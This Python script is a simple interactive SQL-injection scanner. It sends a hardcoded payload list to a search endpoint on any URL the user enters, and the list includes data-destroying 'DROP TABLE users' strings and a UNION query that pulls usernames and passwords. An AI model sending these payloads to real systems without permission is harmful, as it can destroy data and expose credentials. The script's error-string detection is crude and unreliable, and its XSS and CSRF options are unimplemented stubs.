import requests
import logging

# Configure logging
logging.basicConfig(filename='vulnerability_scanner.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def check_sql_injection(url):
    # Define a list of SQL injection payloads to test
    payloads = [
        "' OR 1=1 --",
        "'; DROP TABLE users --",
        "1'; DROP TABLE users --",
        "1 AND 1=1",
        "1 OR 1=1",
        "1; SELECT * FROM users",
        "1' UNION SELECT null, username, password FROM users --",
        "1' OR 'a'='a",
        "1' AND 'a'='a",
        "1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --",
    ]

    vulnerabilities_found = []

    for payload in payloads:
        # Craft the request URL with the payload
        test_url = f"{url}/search?query={payload}"

        try:
            # Send a GET request to the URL
            response = requests.get(test_url)

            # Check if the response contains any indication of a successful SQL injection
            if "error" in response.text:
                vulnerabilities_found.append(test_url)
                logging.info(f"Vulnerability Found: {test_url}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error connecting to {test_url}: {e}")

    return vulnerabilities_found

def get_feedback():
    feedback = input("Would you like to provide feedback? (yes/no): ")
    if feedback.lower() == "yes":
        feedback_text = input("Please provide your feedback, bug reports, or suggestions: ")
        # You can store the feedback in a file, send it to a server, or process it as needed.
        print("Thank you for your feedback!")

def scan_for_vulnerabilities(target_url):
    while True:
        print("\nSelect the vulnerability type to scan for:")
        print("1. SQL Injection")
        print("2. XSS (Cross-Site Scripting)")
        print("3. CSRF (Cross-Site Request Forgery)")
        print("4. Exit")

        choice = input("Enter your choice (1/2/3/4): ")

        if choice == '1':
            vulnerabilities_found = check_sql_injection(target_url)
            if vulnerabilities_found:
                print("Vulnerabilities Found:")
                for vulnerability_url in vulnerabilities_found:
                    print(vulnerability_url)
            else:
                print("No SQL Injection vulnerabilities found.")
        elif choice == '2':
            # Add code to check for XSS vulnerabilities here
            print("XSS scanning not implemented yet.")
        elif choice == '3':
            # Add code to check for CSRF vulnerabilities here
            print("CSRF scanning not implemented yet.")
        elif choice == '4':
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    print("Welcome to the Simple Vulnerability Scanner")
    target_url = input("Enter the target URL to scan (or 'quit' to exit): ")

    if target_url.lower() == 'quit':
        exit()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url  # Add http:// prefix if missing

    scan_for_vulnerabilities(target_url)

    get_feedback()
